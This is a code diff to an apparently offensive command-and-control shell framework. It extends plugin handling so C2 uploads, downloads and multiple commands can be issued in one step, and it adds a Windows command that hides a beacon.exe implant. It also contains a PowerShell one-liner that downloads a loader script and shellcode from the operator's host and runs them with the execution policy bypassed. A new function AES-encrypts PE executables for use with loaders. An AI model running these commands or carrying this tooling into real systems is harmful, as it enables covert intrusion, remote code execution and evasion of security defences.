@@ -833,25 +833,41 @@ class LazyOwnShell(cmd2.Cmd):
                         self.cmd(final_command)
 
                     if 'upload_file' in tool:
-                        remotecmd = tool['upload_file']
-                        cmd_remotecmd = f"upload_c2 {remotecmd}"
-                        self.display_toastr(f"Remote Upload executing: {cmd_remotecmd}", type='info')
-                        self.onecmd(cmd_remotecmd)
-                        self.cmd("sleep 10")
+                        upload_files = tool['upload_file']
+                        file_list = [f.strip() for f in upload_files.split(',')]
+                        
+                        for file_path in file_list:
+                            if file_path:
+                                cmd_remotecmd = f"upload_c2 {file_path}"
+                                self.display_toastr(f"Remote Upload executing: {cmd_remotecmd}", type='info')
+                                self.onecmd(cmd_remotecmd)
+                                self.cmd("sleep 10")
+
                     if 'remote_command' in tool:
                         remotecmd = replace_command_placeholders(tool['remote_command'], self.params)
                         cmd_remotecmd = f"issue_command_to_c2 {remotecmd}"
                         self.display_toastr(f"Remote command executing: {remotecmd}", type='info')
                         self.onecmd(cmd_remotecmd)
+
                     if 'download_file' in tool:
-                        downloadcmd = tool['download_file']
-                        cmd_downloadcmd = f"download_c2 {downloadcmd}"
-                        self.display_toastr(f"Remote Upload executing: {cmd_downloadcmd}", type='info')
-                        self.onecmd(cmd_downloadcmd)
+                        download_files = tool['download_file']
+                        
+                        file_list = [f.strip() for f in download_files.split(',')]
+                        
+                        for file_path in file_list:
+                            if file_path: 
+                                cmd_downloadcmd = f"download_c2 {file_path}"
+                                self.display_toastr(f"Remote Upload executing: {cmd_downloadcmd}", type='info')
+                                self.onecmd(cmd_downloadcmd)
+
                     if 'lazycommand' in tool:
                         lazycommand = replace_command_placeholders(tool['lazycommand'], self.params)
                         self.display_toastr(f"Lazy Command executing: {lazycommand}", type='info')
-                        self.onecmd(lazycommand)                        
+                        
+                        commands = [cmd.strip() for cmd in lazycommand.split(',')]
+                        for cmd in commands:
+                            if cmd:
+                                self.onecmd(cmd)
 
                 except KeyError as e:
                     self.display_toastr(f"Error: Missing parameter '{e}' in the plugin configuration.", type='error')
@@ -6453,6 +6469,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show running services", "net start"),
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
+            ("WIN Hiding the file beacon.exe", "attrib.exe +h .\\beacon.exe"),
             ("WIN set lhost as TrustedHost", f"Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value \"{lhost}\" -Force"),
             ("WIN Hellbird", f"powershell -ep bypass -c \"IWR http://{lhost}/hellbird.ps1 -OutFile hellbird.ps1; .\hellbird.ps1 -Target windows -Url 'http://{lhost}/shellcode_windows.txt' -Key '0x33'\""),
             ("WIN domain trust", "nltest /domain_trusts"),
@@ -27430,6 +27447,32 @@ class LazyOwnShell(cmd2.Cmd):
         except ValueError:
             print_error("Please enter a number.")
 
+    def do_aes_pe(self, line):
+        """Encrypt with AES and random key to PE EXE file, to usage with loaders.
+
+        Usage: aes_pe
+        You will be prompted for:
+        - the PE Exe file (descriptive name)
+
+        Example:
+        aes_pe
+
+        The files key.bin and cipher.bin will be available in 'sessions' immediately and persist across the web server.
+        """
+        try:
+            exe = get_users_dic("exe")
+        except:
+            self.display_toastr(f"Failed geting file: {exe}", type="error")
+            return
+
+        file = open(exe, "rb")
+        content = file.read()
+        KEY = urandom(16)
+        ciphertext, key = AESencrypt(content, KEY)
+        dropFile(KEY,ciphertext)
+        self.display_toastr(f"The files cipher.bin and key.bin are witchcrafted in sessions directory for the file: {exe}", type="info")
+        return
+    
 def main():
     p = LazyOwnShell()
     p.load_yaml_plugins()
